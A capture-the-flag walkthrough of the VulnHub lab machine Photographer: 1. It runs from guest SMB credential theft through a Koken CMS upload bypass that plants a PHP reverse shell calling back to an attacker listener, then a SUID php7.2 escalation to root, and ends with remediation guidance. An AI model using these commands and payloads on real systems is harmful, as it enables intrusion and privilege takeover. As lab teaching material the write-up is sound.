# Photographer: 1 — Snap, Click, Root

Alright dudes!! Who would have thought a photography CMS would be sitting there with SMB shares spilling credentials in plain text? Photographer: 1 is one of those "chef's kiss" machines where the chain just flows: SMB email leak gives you the Koken CMS password, a known file upload bypass gets you a shell, and then a SUID PHP binary literally hands you root. No cap, this one is goated for learning the full web-to-root pipeline.

Shoutout to v1n1v131r4 for building a machine that teaches three distinct real-world vulnerability classes in one clean chain. Legit top-tier beginner/intermediate box.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Photographer: 1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/photographer-1,519/ |
| **Techniques** | SMB enumeration, credential extraction from email, Koken CMS file upload bypass, PHP reverse shell, SUID GTFOBin |
| **CVEs** | CVE-2020-29599 (Koken CMS 0.22.24 arbitrary file upload) |
| **APT Groups** | FIN7 (file upload exploits as initial access in hospitality and retail targets); APT41 (abuses CMS vulnerabilities for initial footholds in creative industry orgs) |

---

## Attack Summary

```
nmap → 80 (HTTP Apache), 445 (SMB Samba), 8000 (HTTP Koken CMS)
  → smbclient -L → sambashare (no auth)
  → smb: get mailsent.txt → daisa@photographer.com:babygirl
  → http://target:8000/admin/ → login with discovered creds
  → Koken 0.22.24 → Content > Import → upload shell.php.jpg
  → Burp intercept → rename filename to shell.php → forward
  → nc -lvp 4444 → curl storage/originals/XX/YY/shell.php
  → shell as www-data
  → find / -perm -4000 → /usr/bin/php7.2 SUID
  → /usr/bin/php7.2 -r "pcntl_exec('/bin/sh',['-p']);"
  → uid=0(root)
  → cat /root/proof.txt
```

---

## Methodology

1. Full port scan: identify HTTP (80), SMB (445), Koken CMS (8000)
2. SMB enumeration: list shares, access sambashare without credentials
3. Credential extraction: retrieve mailsent.txt from SMB share
4. CMS login: authenticate to Koken admin panel
5. File upload bypass: exploit CVE-2020-29599 via Burp Suite intercept
6. Reverse shell delivery: trigger uploaded PHP shell via direct URL
7. Shell stabilization: python3 pty upgrade
8. SUID enumeration: find setuid binaries
9. GTFOBin escalation: php7.2 SUID to root
10. Flag capture

---

## Step 1 — Host Discovery and Full Port Scan

```bash
sudo netdiscover -r 192.168.0.0/24
# Target identified: 192.168.0.76

nmap -p- -A -T4 192.168.0.76
```

```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.x
445/tcp  open  netbios-ssn Samba
8000/tcp open  http     Apache httpd 2.4.x (Koken CMS)
```

Three services: Apache on 80 (static site), Samba on 445, and another Apache on 8000 running Koken CMS. The presence of SMB on a web server box is always suspicious. CTF or real engagement, that share is getting enumerated first.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — SMB Enumeration

```bash
smbclient -L //192.168.0.76 -N
```

```
Sharename       Type      Comment
---------       ----      -------
sambashare      Disk
IPC$            IPC
```

A share named `sambashare` is accessible without credentials. Connect and list:

```bash
smbclient //192.168.0.76/sambashare -N
smb: \> ls
  .                                   D        0
  ..                                  D        0
  mailsent.txt                        N     1500
  wordpress.bkp.zip                   N   394484

smb: \> get mailsent.txt
smb: \> get wordpress.bkp.zip
smb: \> exit
```

**Alternative:** `smbmap -H 192.168.0.76` gives a quick overview of all readable shares without interactive prompt.

Read the mail:

```bash
cat mailsent.txt
```

```
To: Daisa Ahomi
From: Agi Clarence
Subject: Your Koken Website

...
Just to let you know that your new photography website has been set up...
...your password is: babygirl
...
Email: daisa@photographer.com
```

Credentials: `daisa@photographer.com` / `babygirl` — delivered in cleartext inside an email stored on a guest-accessible SMB share. Wild.

**Real-world note:** Guest-accessible SMB shares are still endemic in small businesses and creative studios. Pen testers consistently find them in the first 10 minutes of an engagement. OceanLotus (APT32) and FIN7 both include SMB enumeration in their standard initial access playbooks.

**MITRE ATT&CK:** T1021.002 — Remote Services: SMB; T1552.001 — Credentials in Files

---

## Step 3 — Koken CMS Login

Navigate to `http://192.168.0.76:8000/admin/` and log in with `daisa@photographer.com` / `babygirl`. The admin dashboard loads, confirming the credentials are valid.

Check the Koken version: it's **0.22.24**, vulnerable to CVE-2020-29599 (arbitrary file upload via the import feature).

**MITRE ATT&CK:** T1078 — Valid Accounts

---

## Step 4 — PHP Reverse Shell via Koken File Upload Bypass (CVE-2020-29599)

Koken's import feature validates file extension client-side and checks for image extension server-side, but doesn't validate MIME type or file content. The bypass: rename the PHP shell to `shell.php.jpg` to pass the check, then intercept and rename it back.

Prepare the shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Edit the variables inside `shell.php`:

```php
$ip = '192.168.0.100';   // Attacker IP
$port = 4444;
```

Rename to fool the extension check:

```bash
mv shell.php shell.php.jpg
```

Start a listener:

```bash
nc -lvnp 4444
```

In Koken admin: **Content > Import Content** — upload `shell.php.jpg`.

Intercept the upload request in Burp Suite. In the `Content-Disposition` header, locate:

```
filename="shell.php.jpg"
```

Change it to:

```
filename="shell.php"
```

Forward the modified request. The server stores the file as `shell.php` in the originals path. Find the upload path in the Koken admin panel (Content section shows the file URL), then trigger it:

```bash
curl http://192.168.0.76:8000/storage/originals/XX/YY/shell.php
```

Reverse shell callback received as `www-data`.

**What makes this dangerous?** Extension-only validation is trivially bypassed by intercepting the multipart request. Server-side content-type validation (checking magic bytes, not just extension) would prevent this. CWE-434 (Unrestricted Upload of File with Dangerous Type) has been in OWASP Top 10 since 2010 and still shows up constantly.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Unix Shell

---

## Step 5 — Shell Stabilization

```bash
# On victim:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# On attacker (Ctrl+Z to background):
stty raw -echo; fg
# Press Enter twice
```

Full interactive TTY with tab completion and job control. Essential before running anything that requires an interactive shell (like sudo).

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — SUID Enumeration and GTFOBin Escalation

Enumerate SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/passwd
...
```

`/usr/bin/php7.2` has the SUID bit set. PHP with SUID is an immediate GTFOBins win:

```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```

```
# id
uid=33(www-data) gid=33(www-data) euid=0(root)
# cat /root/proof.txt
```

Root achieved. The `euid=0` means we have root effective privileges even though the real UID is www-data.

**Real-world note:** Setting the SUID bit on any interpreted language runtime (PHP, Python, Perl, Ruby) is one of the most critical misconfigurations on Linux. The runtime can load arbitrary code with root privileges. GTFOBins documents exploitation techniques for every major interpreter. This is found in production environments that install PHP system-wide via package manager and then accidentally set SUID during a botched permissions change.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid; T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Credential | daisa@photographer.com:babygirl | SMB sambashare/mailsent.txt | Direct login to Koken CMS admin |
| Web shell | shell.php | Uploaded via Koken import bypass | Triggered via direct URL |
| Root shell | euid=0(root) | SUID /usr/bin/php7.2 GTFOBin | pcntl_exec escalation |
| Root flag | proof.txt | /root/proof.txt | Cat after root escalation |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SMB share with guest access containing email with plaintext password | Thousands of SMBs leave Samba shares readable; emails with credentials are common | Disable guest SMB access; never store plaintext credentials in file shares |
| 2 | Koken CMS CVE-2020-29599: extension-only file upload validation bypassed via Burp | CMS file upload bypasses are in every web app pen test; extension checks alone are never sufficient | Validate MIME type server-side, check magic bytes, store uploads outside web root, never execute uploaded content |
| 3 | SUID bit on /usr/bin/php7.2 — immediate root via GTFOBins | SUID on interpreter runtimes appears in environments with sloppy permission management or legacy deployments | Audit SUID binaries regularly; remove SUID from all interpreter runtimes |
| 4 | Weak admin password (babygirl) on CMS with no MFA | CMS platforms are primary targets for credential stuffing and brute force | Enforce strong passwords; implement MFA on all admin panels |
| 5 | WordPress backup (.bkp.zip) in the SMB share | Backup files in accessible locations expose the entire application codebase and configuration | Store backups in offline, access-controlled locations; include backups in security review scope |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid | T1548.001 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Lateral Movement | Lateral Movement | Remote Services: SMB | T1021.002 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable guest SMB access** — configure Samba: `map to guest = never`; require authentication for all shares
2. **Remove plaintext credentials from all file shares** — conduct a company-wide audit; implement a secrets manager (HashiCorp Vault, AWS Secrets Manager)
3. **Upgrade or replace Koken CMS** — Koken is unmaintained since 2020; migrate to an actively maintained CMS
4. **Implement server-side file upload validation** — validate MIME type, magic bytes, and extension; block PHP execution in upload directories
5. **Remove SUID from /usr/bin/php7.2** — `chmod u-s /usr/bin/php7.2`; audit all SUID binaries quarterly
6. **Enforce strong passwords and MFA** on all CMS admin panels

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all SMB shares; audit CMS versions and plugins |
| Protect | Access Control | Disable guest SMB; require MFA on admin panels |
| Protect | Data Security | Remove plaintext credentials from file shares |
| Detect | Anomalies and Events | Alert on SMB anonymous access; monitor CMS file uploads |
| Respond | Response Planning | Remove uploaded webshells; rotate all exposed credentials |
| Recover | Recovery Planning | Rebuild compromised host; audit all system-wide SUID binaries |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | SMB share authentication enforcement |
| AC-6 | Least Privilege | Remove SUID from PHP binary |
| IA-5 | Authenticator Management | Enforce strong passwords; rotate exposed credentials |
| CM-7 | Least Functionality | Disable guest SMB; restrict file types accepted by CMS |
| SC-28 | Protection of Information at Rest | No credentials in file shares |
| SI-3 | Malicious Code Protection | Detect PHP files uploaded to web-accessible directories |

### CISA KEV

CVE-2020-29599 (Koken CMS arbitrary file upload) is a representative example of the CMS file upload vulnerability class that CISA has flagged repeatedly (AA21-116A, AA22-074A). Organizations running unmaintained CMS platforms should migrate or isolate immediately per CISA guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (disable guest SMB; enforce upload validation)
- **D3-OAM** — Operating System Administrative Management (SUID auditing and removal)
- **D3-HBPI** — Harden Build Pipeline Integrity (no credentials in deployed artifacts or file shares)

---

## Final Thoughts

Photographer: 1 is the perfect "real world in miniature" machine. The credential chain (SMB share → email → CMS → web shell → SUID root) mirrors exactly the kind of attack paths found in small business and creative agency engagements. The fact that each step is realistic makes this one stand out from pure puzzle CTFs.

If you played it: you now know that SMB guest access, extension-only file upload validation, and SUID on interpreter runtimes are all "instant loss" configurations in any pentest. That knowledge directly translates to real assessments.

GG dude, well played. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
